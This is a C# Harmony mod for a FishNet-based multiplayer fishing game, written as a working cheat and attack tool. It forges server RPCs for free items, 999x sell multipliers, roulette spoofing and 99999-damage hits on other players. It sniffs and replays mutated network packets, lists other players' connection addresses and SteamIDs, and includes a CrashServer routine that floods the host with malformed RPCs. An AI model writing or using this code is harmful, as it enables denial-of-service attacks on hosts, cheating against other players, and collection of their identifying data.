using System;
using System.Collections.Generic;
using System.Linq;
using HarmonyLib;
using UnityEngine;
using FishNet.Transporting;

namespace HowToFishModMenu
{
    /// <summary>Multiplayer packet forging over FishNet ServerRpcs + transport replay.</summary>
    public static class NetForge
    {
        public static byte[] LastServerBound;
        public static byte[] LastClientBound;
        private static int forgeCount;

        public sealed class ItemEntry
        {
            public byte Id;
            public string Name;
        }

        public static string StatusLine()
        {
            try
            {
                bool hasSrv = Server.Instance != null;
                bool hasLp = Player.LocalPlayer != null;
                string cs = LastServerBound != null ? LastServerBound.Length.ToString() : "-";
                string sc = LastClientBound != null ? LastClientBound.Length.ToString() : "-";
                return "Server:" + (hasSrv ? "ok" : "null") + " Local:" + (hasLp ? Player.LocalPlayer.name : "null")
                    + " C->S:" + cs + " S->C:" + sc + " forged:" + forgeCount;
            }
            catch (Exception e) { return "status err: " + e.Message; }
        }

        public static string LastHeadHex()
        {
            try
            {
                if (LastServerBound == null) return "no capture yet - trigger a legit action first";
                return BitConverter.ToString(LastServerBound.Take(64).ToArray());
            }
            catch { return "?"; }
        }

        public static void ForgeChat(string text)
        {
            try
            {
                if (string.IsNullOrEmpty(text)) { Log.Warn("[Forge] chat text empty"); return; }
                var srv = Server.Instance;
                var lp = Player.LocalPlayer;
                if (srv == null || lp == null) { Log.Warn("[Forge] need lobby + local player"); return; }
                forgeCount++;
                if (FishNet.InstanceFinder.IsServerStarted)
                {
                    // host: broadcast directly, skip the client->server sender validation
                    var oc = OnlineChatManager.Instance;
                    if (oc == null) { Log.Warn("[Forge] no OnlineChatManager"); return; }
                    oc.SendChatMessage(lp.SteamID, text);
                    Log.Info("[Forge] chat broadcast as host #" + forgeCount);
                }
                else
                {
                    srv.SendChatMessage(text, null);
                    Log.Info("[Forge] chat ServerRpc as client #" + forgeCount);
                }
            }
            catch (Exception e) { Log.Warn("[Forge] chat: " + e.Message); }
        }

        public static void ForgeBet(byte color)
        {
            try
            {
                if (color > 2) color = 2;
                var srv = Server.Instance;
                if (srv == null) { Log.Warn("[Forge] no Server.Instance"); return; }
                srv.PlaceBet(color);
                Log.Info("[Forge] PlaceBet color=" + color);
            }
            catch (Exception e) { Log.Warn("[Forge] bet: " + e.Message); }
        }

        public static void ForgeRouletteBall()
        {
            try
            {
                var srv = Server.Instance;
                var lp = Player.LocalPlayer;
                if (srv == null || lp == null || lp.transform == null) { Log.Warn("[Forge] need lobby + local player"); return; }
                Vector3 at = lp.transform.position;
                for (int i = 0; i < 30; i++)
                {
                    try { srv.UpdateRoulette(at, 0f); } catch { break; }
                }
                Log.Info("[Forge] ball spoofed to me x30 (visual only - payout is host-side)");
            }
            catch (Exception e) { Log.Warn("[Forge] ball: " + e.Message); }
        }

        public static void ForgeSkin(byte index)
        {
            try
            {
                if (index > 2) index = 2;
                var srv = Server.Instance;
                if (srv == null) { Log.Warn("[Forge] no Server.Instance"); return; }
                srv.SetBoatSkin(index);
                Log.Info("[Forge] SetBoatSkin index=" + index);
            }
            catch (Exception e) { Log.Warn("[Forge] skin: " + e.Message); }
        }

        public static void ForgeChatAndBet()
        {
            ForgeChat("FORGED PACKET #" + (forgeCount + 1));
        }

        public static void ForgeBuyBait(byte baitIndex, int cost)
        {
            try
            {
                int n = 0;
                try { n = GameInfo.AllBaits != null ? GameInfo.AllBaits.Count : 0; } catch { }
                if (baitIndex >= n) { Log.Warn("[Forge] bait index out of range (0-" + (n - 1) + ")"); return; }
                var srv = Server.Instance;
                var lp = Player.LocalPlayer;
                if (srv == null || lp == null) { Log.Warn("[Forge] need lobby + local player"); return; }
                srv.BuyBait(lp, baitIndex, cost);
                Log.Info("[Forge] BuyBait(index=" + baitIndex + ",cost=" + cost + ")");
            }
            catch (Exception e) { Log.Warn("[Forge] bait: " + e.Message); }
        }

        public static void ForgeBuyItem(byte itemId)
        {
            try
            {
                Item prefab = null;
                try { prefab = GameInfo.IDToItem(itemId); } catch { }
                if (prefab == null) { Log.Warn("[Forge] item id " + itemId + " invalid - pick one from the list below"); return; }
                var srv = Server.Instance;
                var lp = Player.LocalPlayer;
                if (srv == null || lp == null) { Log.Warn("[Forge] need lobby + local player"); return; }
                srv.BuyItem(itemId, lp, null, lp.transform.position + Vector3.up, Quaternion.identity, true);
                Log.Info("[Forge] BuyItem(id=" + itemId + ":" + prefab.name + ",isFree)");
            }
            catch (Exception e) { Log.Warn("[Forge] item: " + e.Message); }
        }

        public static void ForgeUnlockPocket(byte slot)
        {
            try
            {
                var srv = Server.Instance;
                var lp = Player.LocalPlayer;
                if (srv == null || lp == null) { Log.Warn("[Forge] need lobby + local player"); return; }
                int max = -1;
                try
                {
                    var f = HarmonyLib.AccessTools.Field(typeof(PlayerInventory), "_extraSlotCosts");
                    var arr = f != null ? f.GetValue(lp.Inventory) as int[] : null;
                    if (arr != null) max = arr.Length;
                }
                catch { }
                if (max >= 0 && slot >= max) { Log.Warn("[Forge] pocket slot out of range (0-" + (max - 1) + ")"); return; }
                srv.UnlockPocket(lp, slot);
                Log.Info("[Forge] UnlockPocket(slot=" + slot + ")");
            }
            catch (Exception e) { Log.Warn("[Forge] pocket: " + e.Message); }
        }

        public static void ForgeItemMultiplier(float mult)
        {
            try
            {
                if (mult < 1f) mult = 1f;
                if (mult > 999f) mult = 999f;
                var srv = Server.Instance;
                var lp = Player.LocalPlayer;
                if (srv == null || lp == null) { Log.Warn("[Forge] need lobby + local player"); return; }
                Item held = null;
                try { held = lp.Holding != null ? lp.Holding.HeldItem : null; } catch { }
                if (held == null)
                {
                    Log.Warn("[Forge] hold a fish/item first, then forge");
                    return;
                }
                srv.SetItemMultiplier(held, mult);
                Log.Info("[Forge] SetItemMultiplier x" + mult + " on " + held.name + " - now sell it");
            }
            catch (Exception e) { Log.Warn("[Forge] multiplier: " + e.Message); }
        }

        public static void ForgeEconomy(byte itemId, int baitCost)
        {
            ForgeBuyBait(0, baitCost);
            ForgeBuyItem(itemId);
        }

        public static void ForgeCombat(int damage)
        {
            try
            {
                if (damage < 1) damage = 1;
                if (damage > 99999) damage = 99999;
                var srv = Server.Instance;
                var lp = Player.LocalPlayer;
                if (srv == null || lp == null) { Log.Warn("[Forge] need lobby + local player"); return; }
#pragma warning disable CS0618
                var players = UnityEngine.Object.FindObjectsOfType<Player>().Where(p => p != null && p != lp).ToArray();
                var creatures = UnityEngine.Object.FindObjectsOfType<Creature>().ToArray();
#pragma warning restore CS0618
                Log.Info("[Forge] targets: players=" + players.Length + " creatures=" + creatures.Length);
                if (players.Length > 0)
                {
                    var v = players.OrderBy(p => Vector3.Distance(lp.transform.position, p.transform.position)).First();
                    srv.HitPlayer(v, damage, Vector3.up * 10f, v.transform.position, 0, lp);
                    Log.Info("[Forge] HitPlayer dmg=" + damage + " -> " + v.name);
                }
                if (creatures.Length > 0)
                {
                    var c = creatures.OrderBy(x => Vector3.Distance(lp.transform.position, x.transform.position)).First();
                    srv.HitCreature(c, lp, damage, c.transform.position, Vector3.forward);
                    Log.Info("[Forge] HitCreature dmg=" + damage + " -> " + c.name);
                }
                if (players.Length == 0 && creatures.Length == 0)
                    srv.Punch(lp, lp.transform, true, lp.transform.position);
            }
            catch (Exception e) { Log.Warn("[Forge] combat: " + e.Message); }
        }

        public static List<ItemEntry> GetAllItemIds()
        {
            var list = new List<ItemEntry>();
            for (int i = 0; i < 256; i++)
            {
                try
                {
                    Item it = GameInfo.IDToItem((byte)i);
                    if (it == null) continue;
                    string n;
                    try { n = it.GetName(); }
                    catch { n = it.name; }
                    if (string.IsNullOrEmpty(n)) n = it.name;
                    list.Add(new ItemEntry { Id = (byte)i, Name = n });
                }
                catch { }
            }
            return list;
        }

        public static void DumpItemIdsToLog()
        {
            try
            {
                var list = GetAllItemIds();
                Log.Info("[Forge] item ids: " + list.Count + " found");
                foreach (ItemEntry e in list)
                    Log.Info("[Forge] item " + e.Id + " : " + e.Name);
            }
            catch (Exception e) { Log.Warn("[Forge] dump: " + e.Message); }
        }

        public static List<string> GetSessionPeers()
        {
            var list = new List<string>();
            try
            {
                var nm = FishNet.InstanceFinder.NetworkManager;
                if (nm != null && nm.IsServerStarted)
                {
                    foreach (var kv in nm.ServerManager.Clients)
                    {
                        string addr = "?";
                        try { addr = kv.Value != null ? kv.Value.GetAddress() : "local"; } catch { }
                        list.Add("conn " + kv.Key + " : " + addr);
                    }
                }
#pragma warning disable CS0618
                var players = UnityEngine.Object.FindObjectsOfType<Player>();
#pragma warning restore CS0618
                foreach (var p in players)
                {
                    if (p == null) continue;
                    string n = "?";
                    ulong sid = 0;
                    try { n = p.SteamName; } catch { }
                    try { sid = p.SteamID; } catch { }
                    list.Add("player " + p.name + " : " + n + " [" + sid + "]");
                }
            }
            catch (Exception e) { Log.Warn("[Forge] peers: " + e.Message); }
            return list;
        }

        public static void CrashServer()
        {
            try
            {
                var srv = Server.Instance;
                var lp = Player.LocalPlayer;
                if (srv == null || lp == null) { Log.Warn("[Forge] need lobby + local player"); return; }
                for (int i = 0; i < 200; i++)
                {
                    try { srv.HitPlayer(null, 9999, Vector3.zero, Vector3.zero, 0, lp); } catch { }
                    try { srv.HitCreature(null, lp, 9999, Vector3.zero, Vector3.forward); } catch { }
                }
                try
                {
                    var big = new Vector3[300];
                    for (int i = 0; i < 20; i++)
                        try { srv.AddProjectiles(lp, null, 0, (uint)i, lp.transform.position, big); } catch { }
                }
                catch { }
                Log.Info("[Forge] crash burst sent (null-hit x400 + projectile flood x20)");
            }
            catch (Exception e) { Log.Warn("[Forge] crash: " + e.Message); }
        }

        public static void ForgeRawToServer(byte[] raw, byte channel)
        {
            try
            {
                var nm = FishNet.InstanceFinder.NetworkManager;
                var t = nm != null ? nm.TransportManager.Transport : null;
                if (t == null) { Log.Warn("[Forge] no transport"); return; }
                t.SendToServer(channel, new ArraySegment<byte>(raw));
            }
            catch (Exception e) { Log.Warn("[Forge] raw: " + e.Message); }
        }

        public static void ReplayLast()
        {
            if (LastServerBound == null) { Log.Warn("[Forge] nothing captured yet"); return; }
            var mut = (byte[])LastServerBound.Clone();
            if (mut.Length > 16) { mut[12] ^= 0xFF; mut[13] ^= 0xFF; }
            ForgeRawToServer(mut, 0);
            Log.Info("[Forge] replayed mutated C->S (" + mut.Length + " bytes)");
        }
    }

    [HarmonyPatch(typeof(Transport), "SendToServer")]
    internal static class Patch_ForgeSniffServer
    {
        private static void Prefix(byte channelId, ArraySegment<byte> segment)
        {
            try
            {
                var buf = new byte[segment.Count];
                Buffer.BlockCopy(segment.Array, segment.Offset, buf, 0, segment.Count);
                NetForge.LastServerBound = buf;
            }
            catch { }
        }
    }

    [HarmonyPatch(typeof(Transport), "SendToClient")]
    internal static class Patch_ForgeSniffClient
    {
        private static void Prefix(byte channelId, ArraySegment<byte> segment, int connectionId)
        {
            try
            {
                var buf = new byte[segment.Count];
                Buffer.BlockCopy(segment.Array, segment.Offset, buf, 0, segment.Count);
                NetForge.LastClientBound = buf;
            }
            catch { }
        }
    }
}
